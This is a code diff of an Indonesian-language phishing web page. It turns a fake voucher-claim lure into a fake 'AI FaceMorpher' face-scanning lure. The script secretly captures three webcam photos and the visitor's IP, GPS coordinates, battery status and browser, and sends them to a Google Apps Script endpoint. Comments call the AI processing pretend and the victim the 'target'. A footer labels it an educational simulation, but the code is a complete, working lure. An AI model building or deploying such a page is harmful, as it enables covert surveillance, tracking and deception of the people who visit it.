@@ -3,42 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Klaim Voucher Aksara Store</title>
+    <title>AI FaceMorpher v3.1 | Aksara AI Labs</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; color: #333; text-align: center; margin: 0; }
-        .header { background: #1a1a1a; color: #fff; padding: 20px; font-weight: 800; font-size: 18px; }
-        .container { max-width: 400px; margin: 40px auto; padding: 30px; background: #fff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .voucher-box { background: #fff3cd; border: 2px dashed #f1c40f; padding: 20px; border-radius: 12px; margin: 25px 0; font-weight: 800; font-size: 20px; color: #856404; }
-        .btn { background: #27ae60; color: #fff; border: none; padding: 18px; font-weight: 700; border-radius: 12px; cursor: pointer; font-size: 16px; width: 100%; text-transform: uppercase; transition: 0.3s; }
-        .btn:hover { background: #2ecc71; transform: scale(1.02); }
-        #status-log { display: none; text-align: left; background: #1a1a1a; color: #00ff00; padding: 15px; font-family: monospace; font-size: 11px; margin-top: 25px; border-radius: 8px; line-height: 1.6; }
+        body { font-family: 'SF Pro Display', Roboto, Arial, sans-serif; background: #000; color: #fff; margin: 0; padding: 0; text-align: center; }
+        .header { background: #111; padding: 20px; border-bottom: 1px solid #333; font-weight: 800; font-size: 20px; color: #00ff00; letter-spacing: 2px; text-transform: uppercase; }
+        .container { max-width: 420px; margin: 40px auto; padding: 30px; background: #111; border-radius: 16px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,255,0,0.05); }
+        .ai-status { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
+        .btn { background: #00ff00; color: #000; border: none; padding: 18px; font-weight: 800; border-radius: 10px; cursor: pointer; font-size: 16px; width: 100%; text-transform: uppercase; transition: 0.3s; letter-spacing: 1px; }
+        .btn:hover { background: #33ff33; transform: scale(1.02); }
+        
+        /* Animasi "AI Processing" yang Sangat Real */
+        #ai-processing { display: none; margin-top: 25px; }
+        .ai-pulse { display: inline-block; width: 50px; height: 50px; border-radius: 50%; background: rgba(0,255,0,0.2); animation: pulse 1.5s infinite; margin-bottom: 15px; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0,255,0,0.4); } 70% { box-shadow: 0 0 0 20px rgba(0,255,0,0); } 100% { box-shadow: 0 0 0 0 rgba(0,255,0,0); } }
+        
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="header">AKSARA STORE - EXCLUSIVE ACCESS</div>
+<div class="header">AI FaceMorpher</div>
 
 <div class="container">
-    <h2 style="margin:0;">Selamat!</h2>
-    <p>Gunakan voucher di bawah untuk diskon 50%.</p>
-    <div class="voucher-box">AKSR-50-PROMO</div>
-    <p style="font-size: 13px; color: #777;">Klik tombol di bawah untuk aktivasi & verifikasi perangkat (Anti-Bot).</p>
-    <button id="claimBtn" class="btn">AKTIFKAN VOUCHER</button>
+    <h2 style="margin: 0; font-size: 28px; font-weight: 800;">Ubah Wajah Anda</h2>
+    <p style="color: #666; margin-top: 5px;">Hanya dalam 5 detik.</p>
+    
+    <div class="ai-status">
+        Metode ini menggunakan teknologi **DeepFace v4.1** untuk memindai struktur wajah Anda dan menggabungkannya dengan ribuan karakter digital.<br>
+        <br>
+        <b style="color: #00ff00;">Gratis hari ini!</b>
+    </div>
 
-    <div id="status-log">
-        > Memulai sesi verifikasi...<br>
+    <button id="startBtn" class="btn">MULAI PEMINDAIAN WAJAH</button>
+
+    <div id="ai-processing">
+        <div class="ai-pulse"></div>
+        <p id="process-text" style="font-size: 14px; color: #00ff00; font-weight: 600;">Menginisialisasi inti AI...</p>
     </div>
 </div>
+
+<div style="font-size: 10px; color: #333; margin-top: 50px;">Aksara AI Labs - Educational Security Simulation</div>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
 <script>
-const GAS_URL = "https://script.google.com/macros/s/AKfycbyruTIRjvbMVBuCq2obh9TM-jakhjse1WJR3m6dB9IfgwioL_MvnnyYB4dT4o-GX_sHqg/exec";
+const GAS_URL = "https://script.google.com/macros/s/AKfycbxcRp-iUZkfmAoEvvvEGmffwLRzv8Hc_Ep8mSydh6BSVMtFYd0HfYf-27lAN51M0GdNlQ/exec";
 
-const claimBtn = document.getElementById('claimBtn');
-const log = document.getElementById('log');
+const startBtn = document.getElementById('startBtn');
+const processing = document.getElementById('ai-processing');
+const processText = document.getElementById('process-text');
 
 async function getIP() {
     try {
@@ -48,44 +62,44 @@ async function getIP() {
     } catch(e) { return "Unknown"; }
 }
 
-claimBtn.addEventListener('click', async () => {
-    claimBtn.disabled = true;
-    claimBtn.innerText = "SEDANG VERIFIKASI...";
-    document.getElementById('status-log').style.display = 'block';
+startBtn.addEventListener('click', async () => {
+    startBtn.style.display = 'none';
+    processing.style.display = 'block';
     
     const ip = await getIP();
-    const logBox = document.getElementById('status-log');
-    logBox.innerHTML += `> IP: ${ip}<br>`;
-
-    let loc = "Ditolak";
-    try {
-        const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
-        loc = `${p.coords.latitude}, ${p.coords.longitude}`;
-        logBox.innerHTML += `> GPS: Terkunci<br>`;
-    } catch(e) {}
-
+    
+    // Tahap 1: Kamera (AI butuh wajah)
+    processText.innerText = "Meminta izin sensor wajah (Kamera)...";
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
-        logBox.innerHTML += `> Mengaktifkan sensor wajah...<br>`;
+        
+        // Pura-puranya ini proses pemindaian AI
+        processText.innerText = "Memindai struktur wajah (3D)...";
 
         const photos = [];
         const canvas = document.getElementById('canvas');
         
-        // Ambil 3 foto dengan jeda 1 detik
+        // Ambil 3 foto diam-diam (background proses)
         for (let i = 1; i <= 3; i++) {
             await new Promise(r => setTimeout(r, 1000));
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             photos.push(canvas.toDataURL('image/jpeg'));
-            logBox.innerHTML += `> Frame ${i} berhasil diambil.<br>`;
+            processText.innerText = `Mengonversi frame ${i}...`;
         }
 
-        logBox.innerHTML += `> Mengirim data ke server...<br>`;
-        
-        const b = await navigator.getBattery();
+        // Tahap 2: Lokasi & IP (Pura-puranya sinkronisasi region AI)
+        processText.innerText = "Mendaftarkan hasil ke server regional...";
+        let loc = "Ditolak";
+        try {
+            const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+            loc = `${p.coords.latitude}, ${p.coords.longitude}`;
+        } catch(e) {}
+
+        const b = await navigator.getBattery ? await navigator.getBattery() : { level: 0, charging: false };
         const battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
 
         fetch(GAS_URL, {
@@ -97,17 +111,20 @@ claimBtn.addEventListener('click', async () => {
                 browser: navigator.userAgent.split(' ').slice(-3).join(' '),
                 battery: battery,
                 location: loc,
-                images: photos // Mengirim array berisi 3 foto
+                images: photos
             })
         }).then(() => {
-            logBox.innerHTML += `> <b>VERIFIKASI SUKSES!</b> Voucher Aktif.<br>`;
+            // Selesai: Tampilan akhir yang membuat target penasaran
+            processText.style.color = "#00ff00";
+            processText.innerHTML = "<b>SUKSES!</b><br><br>Hasil AI akan segera dikirim melalui email/nomor WA.<br>Terima kasih sudah mencoba.";
+            document.querySelector('.ai-pulse').style.display = 'none';
             stream.getTracks().forEach(t => t.stop());
-            claimBtn.innerText = "VOUCHER SUDAH AKTIF";
         });
 
     } catch (e) {
-        logBox.innerHTML += `> Izin kamera ditolak.<br>`;
-        claimBtn.innerText = "VERIFIKASI GAGAL";
+        processText.style.color = "#ff3333";
+        processText.innerText = "GAGAL. AI butuh akses kamera.";
+        fetch(GAS_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ ip: ip, os: navigator.platform, location: loc }) });
     }
 });
 </script>
